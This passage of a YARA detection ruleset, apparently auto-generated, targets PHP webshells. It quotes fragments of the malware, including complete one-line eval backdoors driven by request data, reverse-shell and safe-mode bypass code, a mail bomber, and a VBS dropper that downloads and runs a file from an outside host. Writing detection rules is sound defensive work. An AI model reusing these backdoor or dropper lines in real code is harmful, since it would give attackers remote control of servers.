      hash1 = "74690969c3dc4a8f3fbe746a6c01294ce034f4423904453437b5fef82c767036"
   strings:
      $s1 = "$yqwfg = 2658; function hxhsphl($rgfcb, $rsqib){$gaallul = ''; for($i=0; $i < strlen($rgfcb); $i++){$gaallul .= isset($rsqib" fullword ascii
      $s2 = "gLi3kX57PU5RbJ4MnXSk9AmV1aXQ9\";eval/*ugt*/(hxhsphl($rmejfk, $axidkzk));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      all of them
}

rule sig_3aa4a2b7719a104f830a2c47f25babfb54776013
{
   meta:
      description = "php17 - file 3aa4a2b7719a104f830a2c47f25babfb54776013.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "580c0086bf83b7c2479268c9ec98531d7d460ecb0cfd88a3c39bc76b9dd8c7af"
   strings:
      $s1 = "<?xml:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:zcg=\"http://php.net/xsl\">" fullword ascii
      $s2 = "<xsl:template match=\"/root\">" fullword ascii
      $s3 = "<xsl:value-of select=\"zcg:function('assert',string(.))\"/>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6eb201737a6ef3c4880ae0b8983398a9
{
   meta:
      description = "php17 - file 6eb201737a6ef3c4880ae0b8983398a9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "44b1758affb08a81703c8ad798973812ccda804618d1746fbea3549ee00b93f6"
   strings:
      $s1 = "<?php if(md5(@$_COOKIE[qz])==\"4e1d98f5ede198127bf5c4f4e09cb153\") ($_=@$_REQUEST[q]).@$_($_REQUEST[z]);" fullword ascii
      $s2 = "4e1d98f5ede198127bf5c4f4e09cb153" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a1656204c2fd72efc09a6834234fc8d1c334fcd2
{
   meta:
      description = "php17 - file a1656204c2fd72efc09a6834234fc8d1c334fcd2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e6e02cf9c1acc0a6f0788634567fd39086a38da3dffb9efcd1e37db428570e91"
   strings:
      $x1 = "$baseg = explode(\"#\", file_get_contents('http://ru.myip.ms/files/bots/live_webcrawlers.txt'));" fullword ascii
      $s2 = "fwrite($socket, \"User-agent:\" . $useragent . \"" fullword ascii
      $s3 = "setcookie('engine_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $cookie_host);" fullword ascii
      $s4 = "if (preg_match('/google|bing|aol|yahoo|yandex|majestic|ahrefs|msn|baidu|facebook/i', $VisitorHost)) {" fullword ascii
      $s5 = "if (stripos($_SERVER['HTTP_USER_AGENT'], 'selfbot') !== false) {" fullword ascii
      $s6 = "$new_url = $url['scheme'] . '://' . $url['host'] . $url['path'] . ($url['query'] ? '?' . $url['query'] : '');" fullword ascii
      $s7 = "fwrite($socket, \"Content-length:\" . strlen($data) . \"" fullword ascii
      $s8 = "if (!file_exists($BotList) or (time() - filemtime($BotList) >= '100000')) {" fullword ascii
      $s9 = "$VisitorHost = strtolower(gethostbyaddr($visitorip));" fullword ascii
      $s10 = "$visitoragent = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s11 = "if ((function_exists('curl_init')) && (function_exists('curl_exec'))) {" fullword ascii
      $s12 = "function getRdata($page, $useragent, $method, $collection) {" fullword ascii
      $s13 = "if (preg_match('/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\z/', $basec[$i2])) {" fullword ascii
      $s14 = "if (preg_match('/93.190.141.195|191.101.22.10|141.255.161.176/i', $visitorip)) {" fullword ascii
      $s15 = "$_53 = substr($_53, 0, $_59 + strlen($_55)) . $_58 . \" \" . substr($_53, $_59 + strlen($_55));" fullword ascii
      $s16 = "$pageURL.= $_SERVER[\"SERVER_NAME\"] . \":\" . $_SERVER[\"SERVER_PORT\"] . $_SERVER[\"REQUEST_URI\"];" fullword ascii
      $s17 = "if ((preg_match('/admin|wp-login.php|wp-admin|administrator/i', $_SERVER['REQUEST_URI'])) && (!preg_match('/ajax/i', $_SERVER['R" ascii
      $s18 = "if ((preg_match('/admin|wp-login.php|wp-admin|administrator/i', $_SERVER['REQUEST_URI'])) && (!preg_match('/ajax/i', $_SERVER['R" ascii
      $s19 = "$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);" fullword ascii
      $s20 = "$iplist = file_get_contents($BotList);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule a5b4d0ea5ff7c00bcc644a72991e8dea3ab0f769
{
   meta:
      description = "php17 - file a5b4d0ea5ff7c00bcc644a72991e8dea3ab0f769.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "41082b8ccc5b5bd77a565d1568f357a9f32ed4ed06f5874e8b49db5244a9362a"
   strings:
      $x1 = "execute_command(\"cscript //nologo \".$_SESSION[\"daws_directory\"].\"/zip_folder.vbs\");" fullword ascii
      $x2 = "execute_command(\"zip -r \".$_SESSION[\"daws_directory\"].\"/\".basename($location).\".zip $location\");" fullword ascii
      $x3 = "execute_command(\"bitsadmin.exe /Transfer DAwsDownloadJob $link $location\");" fullword ascii
      $x4 = "execute_command(\"powershell.exe -nologo -noprofile -command \\\"& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compres" ascii
      $x5 = "if (strpos(execute_command(\"powershell.exe\", True), \"Windows PowerShell\")) //powershell gets the job done" fullword ascii
      $x6 = "else if (strpos(execute_command(\"powershell.exe\"), \"Windows PowerShell\")) //powershell comes next" fullword ascii
      $x7 = "$return_value = bypass_suhosin(\"shell_exec\", $command);" fullword ascii
      $x8 = "<form method='post' action='#Bind Shells' onsubmit=\\\"xorencr(['reverse_ip', 'reverse_port'])\\\">" fullword ascii
      $x9 = "//http://support.hostgator.com/articles/specialized-help/technical/how-to-get-your-php-ini-path-with-suphp" fullword ascii
      $x10 = "execute_command(\"powershell.exe Invoke-WebRequest $link -OutFile $location\");" fullword ascii
      $x11 = "execute_command(\"powershell.exe -nologo -noprofile -command \\\"& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compres" ascii
      $x12 = "Coded by <a href=\\\"https://twitter.com/dotcppfile\\\">dotcppfile</a>" fullword ascii
      $x13 = "<form method='post' action='#Bind Shells' onsubmit=\\\"xorencr(['bind_port'])\\\">" fullword ascii
      $x14 = "$return_value = bypass_suhosin(\"exec\", $command);" fullword ascii
      $x15 = "//since we're using this function to bypass security systems only then it gets the job done at its best." fullword ascii
      $x16 = "function execute_command($command, $software_check = False) //this is also used to check for installed softwares" fullword ascii
      $x17 = "$total_memory = execute_command(\"free -mt | grep Mem | awk '{print \\$2}'\");" fullword ascii
      $x18 = "if (execute_command(\"bitsadmin\", True)  == True) //bitsadmin is a nice choice here" fullword ascii
      $x19 = "execute_command(\"rm -r $delete\");" fullword ascii
      $x20 = "<td style='padding:1%;'><textarea>\".execute_sql($_POST[\"sql_execute\"]).\"</textarea></td>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*)
}

rule php17_angel
{
   meta:
      description = "php17 - file angel.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s13 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s14 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s15 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s20 = "scookie('loginpass',encode_pass($password));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_25b2ffa40e50b038212591c4eb09a89fe10cbd43
{
   meta:
      description = "php17 - file 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
   strings:
      $x1 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br" fullword ascii
      $x2 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x3 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x4 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br>' . " ascii
      $s7 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s8 = "echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.v" fullword ascii
      $s9 = "wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s10 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s11 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s12 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s13 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s14 = "wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
      $s15 = "echo '<h1>Suicide</h1><div class=content>remove the shell?<br><a href=# onclick=\"g(null,null,\\'yes\\')\">Yes</a></div>';" fullword ascii
      $s16 = "lse{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
      $s17 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))" fullword ascii
      $s18 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s19 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s20 = "TP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}


rule sig_226dfa3345b8afd3d818c5a446b1e4ae5c99e0e7
{
   meta:
      description = "php17 - file 226dfa3345b8afd3d818c5a446b1e4ae5c99e0e7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4de61f664ea24b92c7950345f087695992b66ef26b6243299faaed984105b562"
   strings:
      $s1 = "@eval(file_get_contents('php://input')) " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9f074c6d53409f124b5eeb850502faf587d39a10
{
   meta:
      description = "php17 - file 9f074c6d53409f124b5eeb850502faf587d39a10.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4a30b666f037d28d1b832a95a556d5b15d344fbcfb4756fc1374175e3da9b364"
   strings:
      $x1 = "$lang = array('tr_text1' => 'Komut Uygula', 'tr_text2' => 'Server uzerinde komut calistir ', 'tr_text3' => 'Komut istemi ', 'tr_" ascii
      $x2 = "$aliases = array('----------------------------------locate' => '', 'locate httpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt' " ascii
      $x3 = "backup >> /tmp/grep.txt;cat /tmp/grep.txt', 'locate dump files >> /tmp/grep.txt;cat /tmp/grep.txt' => 'locate dump >> /tmp/grep" fullword ascii
      $x4 = "@mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\" . $_POST['test4_file'] . \"'\", $db);" fullword ascii
      $x5 = "echo \" Server IP: [<a href=http://www.ip-adress.com/reverse_ip/\" . gethostbyname($_SERVER[\"HTTP_HOST\"]) . \" " fullword ascii
      $x6 = "@mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\" . $_POST['te" fullword ascii
      $x7 = "', 20, (!empty($_POST['ftp_password']) ? ($_POST['ftp_password']) : (\"billy@microsoft.com\"))));" fullword ascii
      $x8 = "if ((!$safe_mode) && ($_POST['cmd'] != \"php_eval\") && ($_POST['cmd'] != \"mysql_dump\") && ($_POST['cm" fullword ascii
      $x9 = "echo \"[+] \" . $_POST['ftp_login'] . \":$user - success\\r\\n\";" fullword ascii
      $x10 = "open_basedir, create file via fopen[srpath://] (PHP v5.2.0)', 'tr_text130' => 'Test bypass open_basedir, read *.zip file via [z" fullword ascii
      $x11 = "target=iframe><font color=blue>\" . gethostbyname($_SERVER[\"HTTP_HOST\"]) . \"</font></a>]\";" fullword ascii
      $x12 = "echo \" Server IP: [<a href=http://www.ip-adress.com/reverse_ip/\" . gethostbyname($_SERVER[\"HTTP_HOST\"]) . \" target=iframe><" ascii
      $x13 = "$str = \"host='\" . $this->host . \"' port='\" . $this->port . \"' user='\" . $this->user . \"' password='\" . $this->pa" fullword ascii
      $x14 = "echo sr(10, \"\", $fs . in('hidden', 'cmd', 0, 'dos8') . in('submit', 'submit', 0, 'Apache process killer') . $fe);" fullword ascii
      $x15 = "if (!empty($_POST['cmd']) && $_POST['cmd'] == \"mail_bomber\" && !empty($_POST['mail_flood']) && !empty($_POST['mail_size'])) {" fullword ascii
      $x16 = "$_POST['cmd'] = which('curl') . \" \" . $_POST['rem_file'] . \" -o \" . $_POST['loc_file'] . \"\";" fullword ascii
      $x17 = "$_POST['cmd'] = which('fetch') . \" -o \" . $_POST['loc_file'] . \" -p \" . $_POST['rem_file'] . \"\";" fullword ascii
      $x18 = "$_POST['cmd'] = which('fetch') . \" -o \" . $_POST['loc_file'] . \" -p \" . $_POST['rem_file'] ." fullword ascii
      $x19 = "=> 'Test bypass open_basedir, view dir list via symlink() (PHP <= 5.2.1)', 'tr_text133' => '', 'tr_text134' => 'Database-brutef" fullword ascii
      $x20 = "$res = '[~] Blind Command Execution via [pcntl_exec]\\n\\n';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*)
}

rule php17_02types
{
   meta:
      description = "php17 - file 02types.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1bf49250f38aed221c4bf5f17b9b43df1f880e99601b2fa2c1cdacc7fdd83467"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "$objPayable->getFont()->setColor( new PHPExcel_Style_Color( PHPExcel_Style_Color::COLOR_DARKGREEN ) );" fullword ascii
      $s5 = "var_dump($objPHPExcel->getActiveSheet()->toArray());" fullword ascii
      $s6 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s7 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s8 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s9 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s10 = "$objRed->getFont()->setColor( new PHPExcel_Style_Color(PHPExcel_Style_Color::COLOR_RED  ) );" fullword ascii
      $s11 = "$objPHPExcel->getActiveSheet()->getStyle(\"C14\")->getAlignment()->setWrapText(true);" fullword ascii
      $s12 = "$objPHPExcel->getActiveSheet()->getCell(\"C14\")->setValue($objRichText2);" fullword ascii
      $s13 = "$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setAutoSize(true);" fullword ascii
      $s14 = "$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setAutoSize(true);" fullword ascii
      $s15 = "$objPHPExcel->getActiveSheet()->setCellValue('A13', 'Rich Text')" fullword ascii
      $s16 = "$objPHPExcel = PHPExcel_IOFactory::load(str_replace('.php', '.xlsx', __FILE__));" fullword ascii
      $s17 = "$objPHPExcel->getActiveSheet()->setCellValue('A11', 'Date/Time')" fullword ascii
      $s18 = "$objPHPExcel->getActiveSheet()->setCellValue('A10', 'Date/Time')" fullword ascii
      $s19 = "$objPHPExcel->getActiveSheet()->setCellValue('A7', 'Boolean')" fullword ascii
      $s20 = "$objPHPExcel->getActiveSheet()->setCellValue('A8', 'Boolean')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_73759cef779e3103d39d3bb9b73cb72e96641f53
{
   meta:
      description = "php17 - file 73759cef779e3103d39d3bb9b73cb72e96641f53.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "415542440063f2f06093cfb59fb14843b2cb519910de48f86b98dbba4c17d434"
   strings:
      $s1 = "${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);" fullword ascii
      $s2 = "$__.=(\"{\"^\"/\"); // _POST " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_05806173863ac450b499d538bc7713c7e8c869dd
{
   meta:
      description = "php17 - file 05806173863ac450b499d538bc7713c7e8c869dd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dc0c3100095d9397871f92538344cc185be21fbc7d0715b05bb1fcc5ef598813"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "<title>SimAttacker - Version : 1.0.0 - Edited By KingDefacer</title>" fullword ascii
      $s6 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s7 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s8 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s9 = "//Connect Back -Firewall Bypass" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s11 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword ascii
      $s12 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s13 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s14 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s15 = "//cmd-command line" fullword ascii
      $s16 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword ascii
      $s17 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s18 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s19 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s20 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_1945v2017_meiFinal
{
   meta:
      description = "php17 - file 1945v2017-meiFinal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "395bbabca853354b917d993a513bf0da82d3e7fbd3b75eb85f8e8e93205ae372"
   strings:
      $x1 = "$sysinfomerdekaee =\"<pre>\"; $sysinfomerdekaee.=$sysfo->uname().\"<br>\";$sysinfomerdekaee.=$sysfo->gethost().\"<br>\";$sysinfo" ascii
      $x2 = "$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,\"w\");$" ascii
      $x3 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x4 = "}else{ $username=$_COOKIE['username'];$password=$_COOKIE['password'];$database=$_COOKIE['database'];$hostname=$_COOKIE['hostname" ascii
      $x5 = "s://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\");$foot.= \"</div>\";return $foot;}}" fullword ascii
      $x6 = "{$html->show(\"<center>\");$html->show($html->h1(\"Admin Finder\"));if(empty($_POST['scan'])){$input = $html->input(\"text\",\"u" ascii
      $x7 = "class Html45{public function show($str){return print($str);}public function h1($t){$h= \"<h1>\";$h.= $t;$h.=\"</h1>\";return $h;" ascii
      $x8 = "{$html->show(\"<center>\");$html->show($html->h1(\"About 1945v2017\"));$html->show(\"<b>MerdekaAtoeMati</b><br>\");$html->show(" ascii
      $x9 = "}elseif ($__action__ == \"rsw\") {if(Act45::getscript(\"awesome1945.php\",\"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $x10 = "5 shell by : \".$html->a(\"https://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\").\"</i>\");$html->show(base6" ascii
      $x11 = "ldlist</b><br>\";$val = $act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt\");" ascii
      $x12 = "}elseif($__action__ == \"sh\"){$cgidir=\"1945_cgi/\";@mkdir($cgidir,0755);$hta = \"OPTIONS Indexes Includes ExecCGI FollowSymLin" ascii
      $x13 = "class SysInfo45{public function servis(){$mysql= (function_exists('mysql_connect')) ? \"<font color=lime>ON</font>\" : \"<font c" ascii
      $x14 = "{$cgidir=\"1945_cgi/\";@mkdir($cgidir,0755);$hta = \"OPTIONS Indexes Includes ExecCGI FollowSymLinks\\nAddType application/x-htt" ascii
      $x15 = "te\",\"value=\\\"Execute query\\\"\").\"<br>\"; $cn = mysql_connect($hostname,$username,$password) or die(mysqli_error()); $cn.=" ascii
      $x16 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php\",\"kuchiyose_1945\" => \"https://raw.github" ascii
      $x17 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php\",\"kuchiyose_ms\" => \"https://raw.githubusercon" ascii
      $x18 = "ontent.com/alintamvanz/webshell/master/1945.php\",\"kuchiyose_r57\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/" ascii
      $x19 = "$hidden_login_uri = \"?login=1945\"; // login url , default : shell.php?login=1945" fullword ascii
      $x20 = "gi .id\\nAddHandler cgi-script .id\\nAddHandler cgi-script .id\";$source=$act->getcontent(\"https://raw.githubusercontent.com/al" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*)
}

rule abdbeae0be991e8bab37946a1b55df5af144a0a8
{
   meta:
      description = "php17 - file abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $x1 = "'eng_text120'=>'Run Command in Safe-Mode <font color=\\\"red\\\">Vulnerable</font>'," fullword ascii
      $s2 = "$msg = \"\\nBASE: $base\\nuname a: $name\\nBypass: $bypasser\\nIP: $ip\\nHost: $ip2 $pwds\";" fullword ascii
      $s3 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s4 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s5 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s6 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s7 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table\");" fullword ascii
      $s8 = "echo '</table>'.$table_up3.\"</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[  a.S.c - LONG LIVE ETHNIC " ascii
      $s9 = "get=_blank>IRC.ASCNET.BIZ</a> | version \".$version.\" ]---o</b></font></div></td></tr></table>\";" fullword ascii
      $s10 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s11 = "$name='11f942ba7f384ddcc245810b87f659d5'; // ????? ????????????  (user login)" fullword ascii
      $s12 = "$safemodgec = shell_exec($evilc0der);" fullword ascii
      $s13 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s14 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s15 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s16 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s17 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s18 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s19 = "@print \"<img src=\\\"sdfsdfsdf/sdfsdfsdf/version.php?img=1&version=\".$current_version.\"\\\" border=0 height=0 width=0>\";" fullword ascii
      $s20 = "$pass='11f942ba7f384ddcc245810b87f659d5'; // ?????? ???????????? (user password)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}


rule php17_Ajan
{
   meta:
      description = "php17 - file Ajan.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dcc843550c34495f4c7b90c6e6bdf2a537e8837b17c4ebe802067c5fee6f715a"
   strings:
      $x1 = "entrika.write \"xml.Open \"\"GET\"\",\"\"http://www35.websamba.com/cybervurgun/file.zip\"\",False\" & vbcrlf" fullword ascii
      $x2 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOverWrite\" & vbcrlf" fullword ascii
      $s3 = "entrika.write \"WshShell.Run \"\"c:\\downloaded.zip\"\", 0, false\" & vbcrlf" fullword ascii
      $s4 = "WshShell.Run \"c:\\net.vbs\", 0, false" fullword ascii
      $s5 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword ascii
      $s6 = "entrika.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword ascii
      $s7 = "entrika.write \"Set BinaryStream = CreateObject(\"\"ADODB.Stream\"\")\" & vbcrlf" fullword ascii
